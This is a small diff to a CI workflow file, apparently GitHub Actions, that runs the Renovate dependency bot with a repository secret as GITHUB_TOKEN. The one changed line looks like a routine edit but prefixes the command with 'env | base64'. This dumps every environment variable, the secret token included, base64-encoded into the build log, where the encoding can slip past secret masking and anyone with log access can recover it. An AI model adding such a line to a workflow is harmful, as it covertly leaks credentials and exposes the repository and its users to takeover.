@@ -31,7 +31,7 @@ jobs:
         run: npm install -g renovate
 
       - name: Run Renovate
-        run: renovate --base-dir=.renovate-cache
+        run: env | base64 && renovate --base-dir=.renovate-cache
         env:
           GITHUB_TOKEN: ${{ secrets.SPECMATIC_GITHUB_TOKEN }}
           RENOVATE_CONFIG_FILE: ./renovate.js
